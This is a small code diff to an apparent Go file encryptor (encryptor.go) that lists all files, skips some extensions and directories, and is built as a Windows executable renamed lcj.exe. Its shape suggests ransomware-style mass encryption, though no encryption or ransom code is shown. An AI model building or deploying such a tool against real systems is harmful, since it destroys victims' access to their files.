@@ -572,7 +572,7 @@ func file_list(file_tree []string)() {
 			//pa = &file_tree
 			//fmt.Println("In for : ", &pa)
 
-			if check_ext(file){
+			if check_ext(file) || is_dir(file){
 				file_tree = remove_to_index(file_tree, 1)
 				continue
 			}
@@ -604,7 +604,7 @@ func file_list(file_tree []string)() {
 	log.Printf("SECOND ELAPSED : %s", elapsed)
 }
 
-func main() { // GOOS=windows GOARCH=amd64 go build -o app-amd64.exe encryptor.go 
+func main() { // GOOS=windows GOARCH=amd64 go build -o lcj.exe encryptor.go
 	encryption_key()
 	files := get_all_files()
 	file_list(files)
